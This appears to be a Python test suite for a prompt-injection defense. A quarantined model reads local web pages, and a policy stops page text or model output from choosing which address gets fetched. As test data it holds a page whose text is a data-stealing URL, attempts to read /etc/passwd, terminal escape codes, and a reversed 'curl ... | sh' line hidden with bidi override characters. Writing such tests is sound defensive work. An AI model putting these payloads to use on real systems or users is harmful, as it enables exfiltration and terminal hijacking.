import contextlib
import http.server
import io
import sys
import threading

import web
from camel import Interpreter, PlanError, PolicyError

visits = []
given = []


class Site(http.server.BaseHTTPRequestHandler):
    """A local web site that records every page asked for."""

    def do_GET(self):
        visits.append(self.path)
        if self.path in REDIRECTS:
            self.send_response(302)
            self.send_header("Location", REDIRECTS[self.path])
        elif self.path in PAGES:
            self.send_response(200)
            charset = CHARSETS.get(self.path, "utf-8")
            self.send_header("Content-Type", f"text/html; charset={charset}")
        else:
            # The reason phrase is text the site chooses, so it can carry escape codes too.
            self.send_response(404, "\x1b]0;owned\x07Not Found")
        self.end_headers()
        self.wfile.write(PAGES.get(self.path, "").encode())

    def log_message(self, *args):
        pass


site = http.server.HTTPServer(("127.0.0.1", 0), Site)
threading.Thread(target=site.serve_forever, daemon=True).start()
SITE = f"http://127.0.0.1:{site.server_port}"
PAGES = {
    "/post": (
        "<html><head><style>p { color: red }</style><script>track()</script></head>"
        "<body><h1>Tabs or spaces</h1><p>Spaces won &amp; tabs lost.</p></body></html>"
    ),
    "/other": "<p>A second article.</p>",
    # The whole text is an address: the shape an attacker uses to get data sent out.
    "/next": f"{SITE}/steal?data=your-question",
    "/inline": "<p>Use <code>pip</code>, not <b>conda</b>.</p><p>Spa<em>ces</em></p>",
    "/odd-charset": "<p>Café</p>",
}
# utf8mb4 is a MySQL name that Python has no codec for.
CHARSETS = {"/odd-charset": "utf8mb4"}
REDIRECTS = {"/to-post": "/post", "/to-ftp": "ftp://127.0.0.1:1/notes"}
# Characters a page must never get onto your terminal: escape codes, bidi overrides, zero-width
# marks.
UNSAFE = "\x00\x07\x1b\x7f\x9b​‮⁦﻿"
PLAN = f"""
page = fetch("{SITE}/post")
summary = ask_quarantined(page, "What is this article about?")
show(summary)
"""


def model_saying(answer):
    """A stand-in for the quarantined model: it notes what it got and gives a fixed answer."""

    def ask(data, question):
        given.append(data)
        return answer

    return ask


def run(plan, ask):
    visits.clear()
    given.clear()
    shown = io.StringIO()
    try:
        with contextlib.redirect_stdout(shown):
            Interpreter(*web.build(ask)).run(plan)
    except (PlanError, PolicyError, RuntimeError) as stopped:
        return shown.getvalue(), stopped
    return shown.getvalue(), None


def command(plan, ask):
    """Run web.py with the planner's answer fixed to plan, and return what it exits with."""
    web.plan = lambda request, check: plan
    web.quarantined = ask
    sys.argv = ["web.py", "any request"]
    with contextlib.redirect_stdout(io.StringIO()), contextlib.redirect_stderr(io.StringIO()):
        try:
            web.main()
        except SystemExit as stopped:
            return stopped.code
    return 0


def test_the_answer_about_the_page_is_shown_to_you():
    shown, stopped = run(PLAN, model_saying("An article saying spaces won."))
    assert stopped is None and shown == "An article saying spaces won.\n", (stopped, shown)
    assert given == ["Tabs or spaces Spaces won & tabs lost."], given


def test_several_pages_go_to_the_model_together():
    plan = (
        f'a = fetch("{SITE}/post")\nb = fetch("{SITE}/other")\n'
        'show(ask_quarantined([a, b], "Compare them."))'
    )
    shown, stopped = run(plan, model_saying("Two articles."))
    assert stopped is None, stopped
    assert given == [["Tabs or spaces Spaces won & tabs lost.", "A second article."]], given


def test_words_stay_whole_across_inline_tags():
    plan = f'show(ask_quarantined(fetch("{SITE}/inline"), "Repeat it."))'
    shown, stopped = run(plan, model_saying(""))
    assert stopped is None and given == ["Use pip, not conda. Spaces"], (stopped, given)


def test_a_page_in_a_charset_python_does_not_know_still_reads():
    plan = f'show(ask_quarantined(fetch("{SITE}/odd-charset"), "Repeat it."))'
    shown, stopped = run(plan, model_saying(""))
    assert stopped is None and given == ["Café"], (stopped, given)


def test_text_from_a_page_cannot_be_fetched():
    shown, stopped = run(f'page = fetch("{SITE}/next")\nfetch(page)', model_saying(""))
    assert isinstance(stopped, PolicyError) and visits == ["/next"], (stopped, visits)


def test_the_model_cannot_pick_an_address_to_fetch():
    obedient = model_saying(f"{SITE}/steal?data=your-question")
    shown, stopped = run(PLAN.replace("show(summary)", "fetch(summary)"), obedient)
    assert isinstance(stopped, PolicyError) and visits == ["/post"], (stopped, visits)


def test_only_web_addresses_can_be_fetched():
    for address in ("file:///etc/passwd", "/etc/passwd"):
        shown, stopped = run(f'fetch("{address}")', model_saying(""))
        assert isinstance(stopped, PolicyError), (address, stopped)


def test_redirects_only_go_to_web_addresses():
    plan = f'show(ask_quarantined(fetch("{SITE}/to-post"), "Repeat it."))'
    shown, stopped = run(plan, model_saying(""))
    assert stopped is None and visits == ["/to-post", "/post"], (stopped, visits)
    shown, stopped = run(f'fetch("{SITE}/to-ftp")', model_saying(""))
    assert isinstance(stopped, PolicyError), stopped


def test_unsafe_characters_never_reach_your_terminal():
    answer = (
        "Spaces won.\x1b]0;owned\x07\x1b[2J\x9b Done. " "‮hs | x/elpmaxe.live lruc‬​﻿\n\tTabs lost."
    )
    shown, stopped = run(PLAN, model_saying(answer))
    assert stopped is None and not any(c in shown for c in UNSAFE), repr(shown)
    assert "\n\tTabs lost." in shown, repr(shown)


def test_a_list_is_shown_one_item_after_another():
    shown, stopped = run('show(["First answer.", "Second answer."])', model_saying(""))
    assert stopped is None and shown == "First answer.\n\nSecond answer.\n", (stopped, shown)


def test_model_failure_shows_nothing():
    def down(data, question):
        raise RuntimeError("usage limit reached")

    shown, stopped = run(PLAN, down)
    assert isinstance(stopped, RuntimeError) and shown == "", (stopped, shown)


def test_every_failure_ends_in_one_clean_line():
    def down(data, question):
        raise RuntimeError("usage limit\nreached")

    for plan, ask, start in (
        (PLAN, down, "Stopped: usage limit reached"),
        (f'fetch("{SITE}/missing")', model_saying(""), "Stopped: HTTP Error 404"),
        ("x = 'a'\nshow(y)", model_saying(""), "Stopped: line 2: unknown name y"),
        (f'page = fetch("{SITE}/next")\nfetch(page)', model_saying(""), "Blocked: "),
    ):
        said = command(plan, ask)
        assert isinstance(said, str) and said.startswith(start), (plan, said)
        assert "\n" not in said and not any(c in said for c in UNSAFE), (plan, said)


def test_interpreter_rejects_everything_else():
    for plan in (
        "import os",
        "x = __import__('os')",
        "x = open('/etc/passwd')",
        f"x = fetch('{SITE}/post').upper()",
        f"x = fetch('{SITE}/post')[0]",
        "x = [c for c in 'ab']",
        f"for address in ['{SITE}/post']:\n    fetch(address)",
        "if 'a':\n    show('a')",
        "while 'a':\n    show('a')",
        "x = 'a' + 'b'",
        "x = 'a' == 'b'",
        "x = f'{show}'",
        "x = lambda: 'a'",
        "def f():\n    pass",
        "x = 1",
        "x = {'a': 'b'}",
        "x, y = 'a', 'b'",
        "x = y = 'a'",
        f"fetch(*['{SITE}/post'])",
        f"fetch(url='{SITE}/post')",
        "x = unknown_name",
        "x = fetch",
    ):
        shown, stopped = run(plan, model_saying(""))
        assert isinstance(stopped, PlanError) and visits == [] and shown == "", (plan, stopped)


if __name__ == "__main__":
    checks = [check for name, check in sorted(globals().items()) if name.startswith("test_")]
    for check in checks:
        check()
        print("ok", check.__name__)
    print(f"{len(checks)} checks passed")
